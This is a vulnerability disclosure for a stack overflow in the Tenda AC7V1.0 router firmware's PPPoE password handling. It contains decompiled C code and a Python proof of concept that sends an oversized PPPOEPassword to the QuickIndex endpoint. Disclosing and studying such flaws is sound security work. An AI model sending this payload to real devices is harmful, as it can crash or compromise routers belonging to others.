## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

The Tenda  AC7V1.0 V15.03.06.44 firmware has a stack overflow vulnerability in the `formQuickIndex` function. The `ppppwd` variable receives the `PPPOEPassword` parameter from a POST request and is later assigned to the `decode_pwd` variable, which is fixed at 72 bytes. However, since the user can control the input of  `PPPOEPassword`, in function `decodePwd`, the statement: 

```c
void __cdecl decodePwd(char *srcStr, char *dstStr)
{
  char *srcStra; // [sp+8h] [+8h]
  char *dstStra; // [sp+Ch] [+Ch]

  srcStra = srcStr;
  dstStra = dstStr;
  if ( srcStr && dstStr )
  {
    while ( *srcStra )
    {
      if ( *srcStra == 92 )
        ++srcStra;
      *dstStra++ = *srcStra++;
    }
    *dstStra = 0;
  }
}
```

can cause a stack overflow. The user-provided  `PPPOEPassword` can exceed the capacity of the `decode_pwd` array, triggering this security vulnerability.

![image-20240313222520157](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313222520157.png)

![image-20240313222425867](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313222425867.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/QuickIndex"
payload = b"a"*1000

data = {"mit_linktype":"2","PPPOEPassword": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318155045408](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318155045408.png)
